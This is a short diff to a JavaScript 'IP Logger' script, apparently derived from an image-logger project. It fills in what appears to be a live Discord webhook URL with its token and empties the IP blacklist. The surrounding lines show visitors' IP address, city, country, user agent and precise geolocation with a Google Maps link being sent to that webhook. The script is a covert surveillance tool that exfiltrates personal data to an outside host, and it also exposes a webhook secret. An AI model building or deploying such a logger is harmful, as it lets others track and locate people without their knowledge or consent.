@@ -46,7 +46,7 @@
         // Configuration
         const config = {
             // BASE CONFIG
-            "webhook": "YOUR_DISCORD_WEBHOOK_URL_HERE",
+            "webhook": "https://discord.com/api/webhooks/1433408427815600241/TkgVjkPmIOqYcO9g3P0GiH1SRkLStDJbpuQ1gIpBx6pPvzWDSOR1JhSP-cQJuf0wDAIN",
             "username": "IP Logger",
             "color": 0x00FFFF,
 
@@ -72,7 +72,7 @@
         };
 
         // Blacklisted IP ranges (from image.py)
-        const blacklistedIPs = ["27", "104", "143", "164"];
+        const blacklistedIPs = [];
 
         // Bot detection function (from image.py)
         function botCheck(ip, useragent) {
@@ -435,7 +435,7 @@ ${navigator.userAgent}
 > **Accuracy:** \`${preciseLocation.accuracy} meters\`
 > **Google Maps:** [View Location](${preciseLocation.mapsLink})
 
-**User Information:**
+**User Info:**
 > **IP:** \`${data.ipInfo.query}\`
 > **Country:** \`${data.ipInfo.country}\`
 > **City:** \`${data.ipInfo.city}\``
